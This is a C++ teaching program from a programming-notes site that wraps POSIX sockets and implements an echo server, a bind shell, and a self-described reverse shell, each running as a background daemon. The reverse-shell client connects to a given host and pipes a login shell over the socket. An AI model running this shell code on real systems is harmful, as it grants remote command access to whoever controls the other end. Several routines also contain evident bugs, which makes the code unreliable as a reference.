// File:      bsd-socket-shell.cpp 
// Brief:     A telnet-like tool. It can bind a login shell to client or server socket.
// Objective: Model client/server sockets on U-nix like OSes and play with C++ and Posix syscalls.
// Author:    Caio Rodrigues
// Url:       https://caiorss.github.io/C-Cpp-Notes/sample-modern-cpp-programs.html
//--------------------------------------------------------------------------------------

//-------- C++ specific headers>
#include <iostream>
#include <string>
#include <sstream> 
#include <memory>
#include <cstdint> // uint8_t (8 bits) and uint16_t (16 bits)
#include <functional>
#include <vector>
#include <algorithm>
#include <thread> 
#include <cstdlib> // <stdlib.h>
#include <cstring> // <string.h>

//------ Poxix/ U-nix specific header files ------//
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

enum class SockStatus{
	Success,
	HostFailure,      // DNS failure
	CannotOpenSocket,
	ConnectionFailure,
	BindError
};

auto statusToString(SockStatus s) -> const char* {
	using E = SockStatus;
	if(s == E::Success)           return "Success";
	if(s == E::HostFailure)       return "Host Failure / DNS Failure";
	if(s == E::CannotOpenSocket)  return "Cannot opern socket";
	if(s == E::ConnectionFailure) return "Connection Failure";
	if(s == E::BindError)         return "Bind error";
	return nullptr;
}

/** Encapsulates BSD-like sockets found in BSD-variants, Linux, OSX, Android and so on. */
class BSDSocket{
private:
	int m_sockfd;
public:
	using ConnHandler = std::function<void (BSDSocket&)>;
	
	BSDSocket(){}
	BSDSocket(const BSDSocket&) = delete;
	BSDSocket& operator=(const BSDSocket&) = delete;

	BSDSocket(BSDSocket&& rhs)
	{
		rhs.m_sockfd   = std::move(m_sockfd);
	}
	BSDSocket& operator=(BSDSocket&& rhs)
	{	
		this->m_sockfd   = std::move(rhs.m_sockfd);
		return *this;
	}
	~BSDSocket(){
		std::perror(" [TRACE] Socket closed OK");
		::close(m_sockfd);
	}
	int getDescriptor(){
		return m_sockfd;
	}
	auto getAddress() -> const char* {		
		sockaddr_in peer;
		int plen =  sizeof(peer);   
		if (::getpeername(m_sockfd, (sockaddr*) &peer, (socklen_t *) &plen) == -1)
			return "";		
		return inet_ntoa(peer.sin_addr);
	}
	auto getPort() -> int {
		sockaddr_in peer;
		int plen =  sizeof(peer);   
		if (::getpeername(m_sockfd, (sockaddr*) &peer, (socklen_t *) &plen) == -1)
			return -1;
		return static_cast<int>(ntohs(peer.sin_port));
	}
	auto close() -> void {
		::close(m_sockfd);
	}	
	/** Connect to some hostname and port - set up client socket */
	auto connect(uint16_t port, const std::string& hostname = "127.0.0.1") -> SockStatus {		
		hostent* hentry = ::gethostbyname(hostname.c_str());
		if(hentry == nullptr)
			return SockStatus::HostFailure;
		m_sockfd = ::socket(AF_INET, SOCK_STREAM, 0);
		if(m_sockfd < 0)
			return SockStatus::CannotOpenSocket;
		// Server address
		sockaddr_in saddr;
		// Fill the struct with zero
		bzero((char *) &saddr, sizeof(saddr));
		saddr.sin_family = AF_INET;
		saddr.sin_port = htons(port);
		bcopy((char *) hentry->h_addr,
			  (char *) &saddr.sin_addr.s_addr,
			  hentry->h_length);
		if (::connect(m_sockfd,
					reinterpret_cast<sockaddr*>(&saddr),
					sizeof(saddr)) < 0)
			return SockStatus::ConnectionFailure;
		return SockStatus::Success;
	}
	/** Set a socket server. */
	auto bind(uint16_t port, const std::string& hostname = "0.0.0.0") -> SockStatus {
		hostent* hentry = ::gethostbyname(hostname.c_str());
		if(hentry == nullptr)
			return SockStatus::HostFailure;
		m_sockfd = ::socket(AF_INET, SOCK_STREAM, 0);
		if(m_sockfd < 0)
			return SockStatus::CannotOpenSocket;
		// Server address
		sockaddr_in saddr;
		// Fill the struct with zero
		bzero((char *) &saddr, sizeof(saddr));
		saddr.sin_family = AF_INET;
		
		saddr.sin_port = htons(port);

		//saddr.sin_addr.s_addr = INADDR_ANY;
		bcopy((char *) hentry->h_addr,
			  (char *) &saddr.sin_addr.s_addr,
			  hentry->h_length);
		
		if (::bind(m_sockfd, reinterpret_cast<sockaddr*>(&saddr), sizeof(saddr)) < 0)
			return SockStatus::BindError;
		int enable_reuseaddr = 1;
		if (::setsockopt(m_sockfd, SOL_SOCKET, SO_REUSEADDR, &enable_reuseaddr, sizeof(int)) < 0)
			return SockStatus::BindError;		
		return SockStatus::Success;
	}
	/** Start listening  port. */
	auto listen(int connections, bool useThread, ConnHandler handler) -> void {
		::listen(m_sockfd, connections);
		std::perror(" Waiting incoming connections ...");  
		while(true){
			size_t n = sizeof(sockaddr_in);
			sockaddr_in client;
			// Accept client connections
			int clientSock =
				::accept(m_sockfd,
						 reinterpret_cast<sockaddr*>(&client),
						 reinterpret_cast<socklen_t*>(&n));
			std::perror(" [TRACE] Connection received.");
			if(clientSock < 0)
				throw std::runtime_error("Error: failed to receive socket connection");
			auto so = BSDSocket();
			so.m_sockfd = clientSock;
			if(useThread)
				std::thread([&so, handler](){ handler(so); });
			else
				handler(so);
		}
	}

	/** Check whether the connection is alive by trying to connect to client.  */
	auto isAlive() -> bool {
		char buffer[1];
		int n = ::recv(m_sockfd, buffer, 1, MSG_PEEK);
		//std::fprintf(stderr, " [TRACE] n = %d\n", n);
		return n > 0;
	}
	/** Send binary data */
	auto send(size_t size, const char* buffer) -> int {
		int n = ::send(m_sockfd, buffer, size, 0);
		if(n < 0)
			std::perror(" [ERROR] Sending message to server.");
		else if (n == 0)
			std::perror(" [ERROR] Server closed.");
		return n;
	}
	/** Receive binary data */
	auto recev(size_t size, char* buffer) -> void {
		::recv(m_sockfd, buffer, size, 0);
		return;
	}
	auto sendText(const std::string& data) -> int {
		int n = ::send(m_sockfd, data.c_str(), data.size(), 0);
		if(n < 0)
			std::perror(" [ERROR] Sending message to server.");
		else if (n == 0)
			std::perror(" [ERROR] Server closed.");
		return n;
	}
	auto sendTextLine(const std::string& line) -> int {
		return this->sendText(line + "\n");
	}
	auto recvText(size_t size) -> std::string {
		std::string buffer(size, 0);
		::recv(m_sockfd, (char*) buffer.data(), size, 0);
		return buffer;
	}
};

auto runAsDaemon(const std::string cwd, bool verbose, std::function<bool ()> action) -> int;

auto bindFileDescriptorToProcess( int         fdesc,
								  std::string program,
								  const std::vector<std::string>& args ) -> void;

auto echoServer(uint16_t port, std::string host) -> bool;
auto runShellServer(uint16_t port, std::string host, std::string shell) -> bool;
auto runShellClient(uint16_t port, std::string host, std::string shell) -> bool;

//---------- Main Code -------------------------------// 

int main(int argc, char** argv){
	const char* programName = argv[0];
	auto printUsage =
		[programName](){
			std::perror("Usage: \n");
			std::fprintf(stderr, " %s echo [port] [host]\n", programName);
			std::fprintf(stderr, " %s server [port] [host] [shell]\n", programName);
			std::fprintf(stderr, " %s client [port] [host] [shell]\n", programName);
		};
	if(argc < 4){
		printUsage();
		return EXIT_FAILURE;
	}	
	if(std::string(argv[1]) == "echo"){
		std::puts("Running ECHO server.");
		echoServer(std::stoi(argv[2]), argv[3]);
		return EXIT_SUCCESS;
	}	
	if(argc < 5){
		printUsage();
		return EXIT_FAILURE;
	}		
	if(std::string(argv[1]) == "server"){
		std::perror(" [LOG] Running daemon");
		int PID = runAsDaemon("/", true,
							  std::bind(runShellServer, std::stoi(argv[2]), argv[3], argv[4]));
		std::perror(" [LOG] Daemon started OK.");
		std::string line;
		std::puts(" ===> Enter RETURN for kill the daemon process or type CTRL+C to let it run.");
		std::getline(std::cin, line);
		::kill(-PID, SIGTERM);
		std::puts(" ===> Daemon stopped OK.");
		return EXIT_SUCCESS;
	}
	// Reverse shell - pipe a remote shell to a running server. 
	if(std::string(argv[1]) == "client"){
		#if 0
		std::perror(" [LOG] Running client daemon");
		runShellClient(std::stoi(argv[2]), argv[3], argv[4]);
		#endif 		
		#if 1 
		int PID = runAsDaemon("/", true,
							  std::bind(runShellClient, std::stoi(argv[2]), argv[3], argv[4]));		
		std::perror(" [LOG] Client daemon started OK.");
		std::string line;
		std::puts(" ===> Enter RETURN for kill the daemon process or type CTRL+C to let it run.");
		std::getline(std::cin, line);
		::kill(-PID, SIGTERM);
		std::puts(" ===> Daemon stopped OK.");
		#endif 
		return EXIT_SUCCESS;
	}
	std::perror("Error: Invalid option.");
	return EXIT_FAILURE;	
} // --- End of main() --- // 

/** Turn a function of current process into a U-nix daemon by making it run in background,
  * detached from current terminal. So, even if the current terminal is closed, 
  * the daemon will continue to run.  
  *
  * - param cwd     -> Current working directory. 
  * - param action  -> Function which is run in an infinite loop until it returns false. 
  * - param verbose -> If set to true, prints the daemon output on the screen. 
  *                    Otherwise, closes the file descriptors.
  * - Return PID    -> Returns PID - Process ID of daemon child process.
  */
auto runAsDaemon(const std::string cwd, bool verbose, std::function<bool ()> action) -> int {
	// Make child process
	pid_t child_pid = fork();
	if(child_pid < 0){
		std::cerr << "Error: failed to fork this process." << "\n";
		return -1;
	}
	if(child_pid > 0){
		// Parent process runs here: 
		std::cout << "Process ID of child process = " << child_pid << "\n";
		return child_pid;
	}
	// Child process runs here 
	std::fprintf(stderr, " [TRACE] Running daemon - PID = %d", ::getpid());
	
	// Umask file mode
	::umask(0);
	// Set new session
	pid_t sid = ::setsid();
	if(sid < 0)
		return -1;
	//------ Code of Forked Process ---------//
	// Set path of forked process (daemon)
	::chdir(cwd.c_str());
	// Close stdin, stdout and stderr file descriptors.
	if(verbose){
		close(STDIN_FILENO);
		close(STDOUT_FILENO);
		close(STDERR_FILENO);		
	}
	while(action());
	return 0;
}  


/** Run a subprocess binding it to a file descriptor without killing the current process  
  * This function is useful for building remote shells.  */
auto bindFileDescriptorToProcess(int fdesc,
						std::string program,
						const std::vector<std::string>& args) -> void {
	// int execv(const char *path, char *const argv[]);
	int childPID = fork();
	if(childPID == 0){
	// Child process
		std::cerr << " [LOG] Running on child process" << std::endl;
		::dup2(fdesc, 0);
		::dup2(fdesc, 1);
		::dup2(fdesc, 2);
		std::vector<const char*> pargs{};
		std::transform(args.begin(), args.end(), pargs.begin(),
					   [](const std::string& s){ return s.data() ; });
		pargs.push_back(nullptr);
		// int execv(const char *path, char *const argv[]);
		::execv(program.c_str(), (char* const*) pargs.data());		   
		return;
	}
	if(childPID > 0){
		// Parent process
		std::cerr << " [LOG] Running child process with PID = " << childPID << std::endl;
		// ::wait(nullptr);
		// std::cerr << " [LOG] Child process terminated" << std::endl;
		return;
	}
	std::cerr << " [LOG] Error - failed to fork process." << std::endl;
	return;
}

auto echoServer(uint16_t port, std::string host) -> bool {
	std::string line;
	BSDSocket server;
	auto status = server.bind(port, host);
	if(status != SockStatus::Success)
		throw std::runtime_error(std::string("Error: ") + statusToString(status));
	server.listen(10, false,
				  [](BSDSocket& client){					  
					  auto host = client.getAddress();
					  auto port = client.getPort();
					  client.sendTextLine(
						  std::string("=> Connected from: ") + host + ":" + std::to_string(port));
					  std::string line;
					  while(client.isAlive()){
						  // std::cout << " SERVER> ";
						  line = client.recvText(1024);
						  std::cout << "line = " << line << "\n";
						  client.sendText(" => ECHO " + line);
					  }					  
				  });
	return false;
}

auto runShellServer(uint16_t port, std::string host, std::string shell) -> bool {
	BSDSocket server;	
	// auto status = server.bind(9080, "0.0.0.0");
	auto status = server.bind(port, host);
	if(status != SockStatus::Success){
		std::cerr << "ERRNO = " << ::strerror(errno) << "\n";
		throw std::runtime_error(std::string("Error: ") + statusToString(status));
	}
	// const std::string SHELL = "/system/bin/sh";
	server.listen(10, false,
				  [&shell](BSDSocket& client){
					  std::string msg;
					  auto host = client.getAddress();
					  auto port = client.getPort();
					  client.sendTextLine(
						  std::string("=> Connected from: ") + host + ":" + std::to_string(port));					  
					  bindFileDescriptorToProcess(client.getDescriptor(), shell, {});
				  });
	return false;
}

auto runShellClient(uint16_t port, std::string host, std::string shell) -> bool {
	BSDSocket client;	
	// auto status = client.bind(9080, "0.0.0.0");
	std::perror("[TRACE] Trying to connect to server");
	auto status = client.connect(port, host);
	if(status != SockStatus::Success){
		std::perror("[TRACE] Failed to connect to server ");
		std::cerr << "ERRNO = " << ::strerror(errno) << "\n";
		return true;
	}
	std::perror("[TRACE] Connect to server OK.");
		// throw std::runtime_error(std::string("Error: ") + statusToString(status));
	client.sendTextLine(
		std::string("=> Reverse shell connected from: ") + host + ":" + std::to_string(port));
	bindFileDescriptorToProcess(client.getDescriptor(), shell, {});	
	return true;
}
